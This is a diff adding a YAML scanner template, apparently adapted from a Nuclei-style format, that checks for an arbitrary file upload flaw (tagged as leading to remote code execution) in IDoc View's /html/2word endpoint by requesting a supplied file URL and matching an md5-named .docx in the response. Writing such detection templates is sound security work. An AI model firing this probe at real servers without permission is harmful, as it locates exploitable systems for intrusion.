@@ -1,0 +1,25 @@
+id: idocview-2word-fileupload
+brief:
+    title: IDoc View /html/2word - Arbitrary File Upload
+    by: DhiyaneshDK
+    level: high
+    about: ""
+    label:
+        - idoc
+        - rce
+        - instrusive
+        - file-upload
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/html/2word?url={{file}}'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(file)}}.docx'
+          in: response
+          need: all
+        - "on": status
+          status:
+            - 200
